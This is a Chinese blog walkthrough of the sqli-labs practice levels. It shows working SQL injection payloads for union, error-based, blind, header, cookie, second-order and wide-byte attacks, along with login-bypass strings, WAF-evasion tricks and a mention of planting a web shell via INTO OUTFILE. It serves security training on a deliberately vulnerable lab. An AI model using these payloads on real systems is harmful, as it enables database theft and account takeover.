---
title: sqli labs Less
date: 2021-10-25 23:10:33
tags: sql
categories: sql
top_img: https://images.unsplash.com/photo-1493514789931-586cb221d7a7?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1171&q=80
cover: https://www.wallpaperup.com/uploads/wallpapers/2012/10/02/17711/5341253fa06818c7ee73c2933e8081a8-1000.jpg
comments: true
---

## 流程（四步走）：

### 查找注入点(注释)--爆库--爆表--爆字段--找到想要的东西或者实现一些操作



## mysql中的特殊库

### information_schema

存储mysql中所有库名，表名，列名

show databases == select table_schema from information_schema.tables;
show tables == select table_name from information_schema.tables where table_schema='数据库名'



## Test 1

1.首先查找闭合点，一般用单引号，发现'1''被这样包裹，把它闭合

![在这里插入图片描述](https://img-blog.csdnimg.cn/1737bf45c660470f813ff2c5dbe27bae.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

2.接着用order by语句查表有几列，可以发现有三列

![在这里插入图片描述](https://img-blog.csdnimg.cn/154dbade26104b7bb6544dc6eb81a514.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/9b59f1ca701f45b59c5307247fb993ce.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

3.然后就可以爆库了，这个可以得到当前数据库名

![在这里插入图片描述](https://img-blog.csdnimg.cn/d62085fe02bc4983a0e46b8c4230690b.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

这个可以得到所有数据库名

![在这里插入图片描述](https://img-blog.csdnimg.cn/9bc99559fd454b038cba8aa133464303.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

4.接着爆表

![在这里插入图片描述](https://img-blog.csdnimg.cn/b5ab677236fe4a588135610889cf7ea1.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

5.爆字段名

![在这里插入图片描述](https://img-blog.csdnimg.cn/2359c27b446c48378616ee71ee39e952.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

6.获取数据

![在这里插入图片描述](https://img-blog.csdnimg.cn/0e1b8dc59fb2405cb921eb9675871aa4.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Test 2

闭合条件不一样，应改为?id=1  其余和less1一样。

## Test 3

闭合改变了，1被'1'')包围，所以采用?id=1') --+ 将其闭合，其余和test1，2相同

![在这里插入图片描述](https://img-blog.csdnimg.cn/6efb8e7cfd87431fb2577499acdee36b.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Test 4

发现使用双引号"时报错，则确定了闭合条件,使用?id=1" --+将其闭合，其余步骤和前三题一样

![在这里插入图片描述](https://img-blog.csdnimg.cn/4f76f0719e3b438898d64523acc9575a.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Test 5（双重查询注入）

### 1、双重就是select语句里再套一个select语句

### 2、理解四种函数

```
Concat(),Rand(), Floor(), Count(),Group by 
```

1、首先查找闭合点

![在这里插入图片描述](https://img-blog.csdnimg.cn/c527974e05694f689cbc95c982cfad1d.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

能判断出 '1''是被这样包裹的，所以我们只需加一个’把他闭合，再把后面的注释掉

2、查库：

```
?id=-1' union select 1,count(*),concat( (select database()),floor(rand()*2)) as a from information_schema.tables group by a --+
```

四种函数的嵌套运用，有些是死格式，自行理解一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/c35114ec67cb41baa7a8236c08712ed2.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

是有50%几率失败的，多查几下就爆出来了数据库名'security'

3、查表

```
?id=-1' union select 1,count(*),concat( (select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+
```

也基本是死格式，注意一下limit函数的用法就可以了

![在这里插入图片描述](https://img-blog.csdnimg.cn/5560cb1d95db4d2788b14b05ef9d47ce.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

通过改变limit的值来查表，得到表名‘users'

4、查字段

```
?id=-1' union select 1,count(*),concat( (select column_name from information_schema.columns where table_name='users' limit 4,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+
```

通过改变limit的值来查

![在这里插入图片描述](https://img-blog.csdnimg.cn/ea8b17a9b39c4f59ba806ee647c31ef0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

5、查用户名和密码

```
?id=-1' union select 1,count(*),concat( (select username from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a --+
```

用户名

![在这里插入图片描述](https://img-blog.csdnimg.cn/96975edd8caa4e8f95eb0c50b475c27a.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/7b603c6a30fe4507a50d4e11a66d5674.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

#### 注意：用户名与密码的列数必须相对应，不然牛头不对马嘴了

sql注入至此完成

## Test 6

除了闭合错误换成了双引号，其他与5一模一样

## Test 7

掌握一句话木马和into outfile的用法

![在这里插入图片描述](https://img-blog.csdnimg.cn/a9a1e07e50134f3baa71d6293a5f4110.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

可以看到这里生成了一个test文件，发现已经被写入了

![在这里插入图片描述](https://img-blog.csdnimg.cn/421537cc1d3d4d519a21ac47c0b8c24e.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

然后用蚁剑连接，密码就是[]里面的

![在这里插入图片描述](https://img-blog.csdnimg.cn/ed3f38d7ffe141f8a62c1f9d61d8f305.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

即可看到对应的文件

## Test 8(布尔盲注)

布尔，即只会返回**ture** or **false**

所以做题就讲究一个字'**猜**'

先了解几个函数：

**length**（查长度）

我这里用的是mysql库，所以返回的是5

![在这里插入图片描述](https://img-blog.csdnimg.cn/3d276fdee9864a228ae5b73d099dcb9a.png)

**substr**（截取字段）substr(1,2)就是从第一个字母开始，依次截取两个字母

![在这里插入图片描述](https://img-blog.csdnimg.cn/414c88b48f794722ba1aeedd9da2f65c.png)

**Ascii**（转化为ascii值）

![在这里插入图片描述](https://img-blog.csdnimg.cn/fd47af92018d42a08e4864a60a439316.png)

1、首先找闭合，发现有字返回，说明返回为ture

![在这里插入图片描述](https://img-blog.csdnimg.cn/8fae508d376e48d9a6f79de2ec753d95.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

2.接着猜测库名长度

![在这里插入图片描述](https://img-blog.csdnimg.cn/909a768eaa0a42d183c61fff0b245ef7.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

最后发现数据库名长度为8

![在这里插入图片描述](https://img-blog.csdnimg.cn/61602924da094a5bb72ab3fe9758bcc2.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

3.运用substr与ascii函数猜测数据库的ascii码值，从而得到数据库字母（这里附上一张ascii表）

![在这里插入图片描述](https://img-blog.csdnimg.cn/c0f70577ea8547d1b14d105b5d6a9caa.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

返回为ture说明首字母大于80，继续猜

![在这里插入图片描述](https://img-blog.csdnimg.cn/b2f41b073b444d8cb1b9830f38204f62.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

最终在ascii值等于115时正确，说明说字母为s

![在这里插入图片描述](https://img-blog.csdnimg.cn/ca3de703d7dc49d1b9bc97e0c7de065b.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

最终得到数据库名security

4.继续猜测表名

这里的database()可以换成数据库的名字

这里注意一下limit的用法，猜测第二个表名的首字母，114的时候返回ture，而第二张表是referers，所以正确。

![在这里插入图片描述](https://img-blog.csdnimg.cn/3fa664a162154a6499ef13a2b940a2f3.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

在第三张表的时候查到了我们想要的uesrs表

![在这里插入图片描述](https://img-blog.csdnimg.cn/b5f664f9c232494ca6df85bab4d87c36.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

5.猜字段名

只需稍微更改一下，更改limit和substr的值得到字段名id，useraname，password

![在这里插入图片描述](https://img-blog.csdnimg.cn/e2a5108201cb4f33898c640ea26fce35.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

6.获取想要的内容

可以直接select password from users/password 

## Test 9（时间盲注）

即通过时间来判断是否正确，正确即延时返回，错误即立即返回

注意**sleep**函数和**if**函数就ok了

如，注意左上角的圈圈，说明成功了

![在这里插入图片描述](https://img-blog.csdnimg.cn/9bf7e0ebe95a42798798e55db150a539.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

其他和8类似，就不多说了。

## Test 10(时间盲注)

把单引号换成双引号，其他和9一模一样。

## 万能密码

1' or '1'='1

原理是当用户登录时，后台执行的语句是：

```
Select * from users where username='"&username&"' and password='"&password"'
```

所以当我们输入1' or '1'='1时，语句就变成了

```
Select * from users where username='1' or '1'='1' and password='"&password"'
```

而且''=''优先于'and'，'and'优先于'or'

所以整个式子时恒成立的，就能更改万能钥匙后面的语句进行注入

## tips

从username注入只能填正确的用户名，因为如果这里不用admin用的别的，那么接下来语句就是ture，语句被执行，返回的是空内容；所以username中的内容必须正确

```
select * from users where username='admin' or '1'='1' and password='随便输' 
```

而从密码栏注入就可以随意填写，因为而这一句其实等同于 select * from users where '1'='1' ，这就是直接执行select * from users 无任何条件。

```
select * from users where username='suibiantian' and password='suibiantian' or '1'='1' 
```

## Test 11

利用万能密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/7ee5863719ab44f7a7cb286d0a4d54c9.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

然后下面我们就可以用之前get型的语句来代替那个恒成立的式子来进行注入了,查库：

```
admin'union select 1,database()#
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/9560ff0021e949f8aa33e06a8aecf52a.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

往后的步骤就是更换后面的语句就不一一讲解了。

## Test 12

这个是把闭合条件换成了双引号加一个括号)，其他和11一样

![在这里插入图片描述](https://img-blog.csdnimg.cn/182fc2ebdc984616abcba0a12425d15b.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

查库：

![在这里插入图片描述](https://img-blog.csdnimg.cn/d48a4fc59bb7441186d3b428c35f4529.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Test 13

注意一个新函数：**extractvalue**()
语法：extractvalue(目标xml文档，xml路径)
而第二个参数是我们可操作的地方，只要第二个参数格式错误，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

首先查找闭合点，发现是单引号加一个括号')

![在这里插入图片描述](https://img-blog.csdnimg.cn/2393b1a103144d2cac60a745ec68b011.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

这里我们发现正常登录没有回显，而有错时有错误回显，所以利用extractvalue函数

爆库：

```
admin') and extractvalue(1,concat(0x7E,(select database()),0x7E))#
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2024092a50694cd6a75d989e13ffd40c.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

爆表：

```
admin') and extractvalue(1,concat(0x7E,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),0x7E))#
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/6d53952d2f27445c9d32d14c76c5d3a7.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

查字段名：

```
admin') and extractvalue(1,concat(0x7E,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'),0x7E))#
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/09d73e5af66a4f688f244e8f56838b6b.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

查数据：

```
admin') and extractvalue(1,concat(0x7E,(select group_concat(username) from users),0x7E))#
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/cf3240aeb4f64f7383f78df06cfb657c.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Test 14

把闭合条件换成双引号加括号")，其他的和13一样

## Test 15(时间盲注)

和get型的时间盲注一样，即第九关，最好是写个python脚本，不然手注很费时间

这里抛一条语句做参考

```
admin' and if(ascii(substr(database(),1,1))>100,sleep(3),1)#
```

详细的关于这几个函数和怎么判断在前文8，9关都有详细介绍。

强烈建议写个python脚本，可以节约很多时间！！！（这里没找到好的脚本就先不写了）

## Test 16（时间盲注）

闭合条件变成了admin")，其他的和15一样，这里就不多赘述了

## Test 17

首先了解一个函数的用法:

**updataxml**-------和extractvalue的使用方法差不多，只是多了一个参数

语法：updataxml(目标xml文档，xml路径，新对象)
而第二个参数是我们可操作的地方，只要第二个参数格式错误，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

这里我们发现不能在uname处注入，那么只能在password那儿注入了

```
passwd=' or updatexml(1,concat(0x7e,database()),2)#
```

这里username要填admin，我也不知到为什么 

![在这里插入图片描述](https://img-blog.csdnimg.cn/20cd127cad9b4717a1492592252c3c21.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

剩下的就是替换select的语句了







**下面三题都是有关请求头head的，可以先了解一下，这里就不解释了，上网一搜就能了解。**



## Text 18(user-agent)

这题是利用user-agent处理注入，但是首先得输入正确的username和password才能进入user-agent处理环节

利用burp抓包改头：updatexml型

![在这里插入图片描述](https://img-blog.csdnimg.cn/dbe640d3122342878621ec20f51c542c.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

extractvalue型

![在这里插入图片描述](https://img-blog.csdnimg.cn/af9b76586ced436bb3151a05956ef433.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

接下来替换语句即可

## Text 19(refer)

和18题一样，只是这个是在refer上动手脚

![在这里插入图片描述](https://img-blog.csdnimg.cn/542480de05c34048a0e988f3f4d53f50.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

接下来替换语句即可

## Text 20(cookie)

这道题是利用cookie注入，更改cookie值构造语句即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/62ca30610e574652ad6c33adc421da6b.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Txet 21

根据题意，就是把uesername和passwo的东西先进行base64编码然后再登陆进去，然后修改cookie的值，同样也是用base64编码

首先查找注入点(从这里开始就需要base64了)，发现闭合条件为一个单引号加一个括号')

![在这里插入图片描述](https://img-blog.csdnimg.cn/958a72df11d4444192cb257bedf20635.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

查库：

原句为：

```
Cookie:uname=-1') union select 1,1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata) #
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/067ab08256d04a3f9469270c331880c1.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

可以看到在password栏就回显了数据库名

但是要注意，这里不能使用数据库里有的名字，否则只会返回一条数据
原句为：

```
admin') union select 1,1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata) #
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/f46414b50041428588113de0c346ce7e.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Text 22

闭合条件变成了双引号"，其他和21一样

## Test 23（过滤注释符）

重点就是知道如何闭合，剩下的就很简单了，联合查询即可，这里还是要注意前面的id=-1那儿不能是数据库里面本来就有的，不然只会返回一条数据

查库：

![在这里插入图片描述](https://img-blog.csdnimg.cn/c405aa3c82f141e9b2fbdbde7967e808.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

查表：

![在这里插入图片描述](https://img-blog.csdnimg.cn/12a02e0fbfa34f5fb3aae461eb52e219.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

查字段和数据就不演示了

## Test 24（二次注入）

原理：
注入点在修改密码那儿

```
updat users set password='$password' where username='$username' and password='$second_password'
```

将其变为：

```php
updat users set password='$password' where username='$username' --#and password='$second_password'  --#后面的都被注释了
```

其实是执行了：

```
updat users set password='新密码' where username='admin'
```

首先注册一个 admin'-- # 的账号，接下来登录该帐号后进行修改密码。此时修改的就是 admin 的密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/46d59e89569a4f699b3232878b4fe47d.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

然后修改密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/b630c8df6278470da8173d69a7dd0036.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

接下来就可以用admin和新密码来登陆了

![在这里插入图片描述](https://img-blog.csdnimg.cn/d48a7b8274e846cb8fbbc78560c6692d.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

成功

![在这里插入图片描述](https://img-blog.csdnimg.cn/e862c99c6d014ca68771ccfb4c17fb3b.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Test 25（过滤or和and的注入）

首先查找闭合，加入--+之后回显正常，说明为单引号闭合

![在这里插入图片描述](https://img-blog.csdnimg.cn/6b95878ab3334cd5aa8772cc0c93cbff.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

尝试查找有多少列，发现回显错误，接着用and试，发现也回显错误，说明or和and都被过滤了

![在这里插入图片描述](https://img-blog.csdnimg.cn/aa74f2a86e0e487584c963ae3fd8d311.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

然后我们就可以采取双写来绕过，即or变成oorr，and变成aanndd

![在这里插入图片描述](https://img-blog.csdnimg.cn/9ce95eb5c95a47ceb9df9b6d199d8413.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

说明绕过成功，下面就是简单的联合注入，就不多赘述了

### 最后总结一下常见的几种绕过方式：

双写绕过—— or=oorr,and=aanndd
大小写变形绕过—— or=Or=oR=OR
利用运算符——  or=||,and=&&
URL编码绕过——  #=%23

## Test 26（过滤空格和注释...）

这关太狠了，过滤了所有空格和注释等等，我们可以利用updatexml函数来进行注入，因为这样不用用到空格，再结合前面的绕过方式，构造paylo

爆库：

![在这里插入图片描述](https://img-blog.csdnimg.cn/050c78f0932b40d7b0e86da9e652b64a.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

爆表：

![在这里插入图片描述](https://img-blog.csdnimg.cn/f101e09594a7460197066b0779dd35d1.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

爆字段：这里不知道为什么&也被过滤了，所以只能用%26来代替

![在这里插入图片描述](https://img-blog.csdnimg.cn/cf8e9954a8754db1a2eae2ca6c00ff61.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

爆数据：这里只能一条一条的爆，因为报错有字符限制不能使用group_concat()

![在这里插入图片描述](https://img-blog.csdnimg.cn/9104d144bf134e64ae5fb05f5cd0d8d2.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Test 26a

闭合条件变成了单引号加一个括号，其他同上

这里介绍一个判断是否有括号的方法

1')||'1'=('1

如果有就是正确回显，如果没有就是错误回显或者没有回显

## Test 27

观察源码发现，这里大概和test26一样，只是多过滤了几个union和select的大小写，所以可以用随机大小写union和select的方法绕过，其他地方和test26一样，值得一提的是这里没过滤or和and

![在这里插入图片描述](https://img-blog.csdnimg.cn/23c56a9ecdea4cfaba10babdc885d835.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

爆库：
![在这里插入图片描述](https://img-blog.csdnimg.cn/8150c93c015c433a910ea55a3f8f2bd3.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

爆表：

![在这里插入图片描述](https://img-blog.csdnimg.cn/16f6bd6f1bf041c7853efcbee06ea6ba.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

剩下的就不演示了，很简单

## Test 27a

闭合条件变成了双引号"，其他同test27

## Test 28*

查看源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/b6fe4fe223a141aca13d71e3bb875aaa.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

可以发现没有过滤or与and。
过滤了相连的union和select，/i同时匹配大小写，\s匹配任意空白字符如制表符、换行符、空格等，使用%a0可以绕过。
过滤了空格和注释。

然后用union查询就可以了，我这里是%a0服务器版本好像不支持，你们应该可以

![在这里插入图片描述](https://img-blog.csdnimg.cn/3b1d22a6fa874117a2cc2b3258b1cd0d.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)


## Test 28a

这关与 28 基本一样，只是过滤条件少了几个。



# ---接下来三个题都是双服务器的注入，简单的绕过WAF

强烈建议看看:原理参考(https://www.jianshu.com/p/46cb6c354de5)

## Test 29

原理懂了就好做了，首先判断闭合，加入--+后回显正确，说明就是最最最简单的单引号闭合

![在这里插入图片描述](https://img-blog.csdnimg.cn/0a19bd884d43465595cd64152dd91cf7.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

这里构造一个查询数据库的payload：

```
http://localhost/Less-29/index.jsp?id=1&id=-2' union select 1,2,concat(select database())--+
```

剩下的更改union后的查询句句就可以了

## Test 30

和29一样，闭合条件变成了双引号"

查库：

```
http://localhost/Less-29/index.jsp?id=1&id=-2" union select 1,2,concat(select database())--+
```

## Test 31

闭合条件变成了双引号加一个括号，其他同上

查库：

```
http://localhost/Less-29/index.jsp?id=1&id=-2") union select 1,2,concat(select database())--+
```

## Test 32（get型宽字节注入）

判断闭合

![在这里插入图片描述](https://img-blog.csdnimg.cn/34e19ccbc24b459eb614598bbeddbb17.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

但是发现我们的'直接变成了\

查看源码，发现这里用的是GBK编码形式，而当数据库的编码为GBK时，可使用宽字节注入，方法就是在单引号前先加一个%df，就能使单引号正常使用

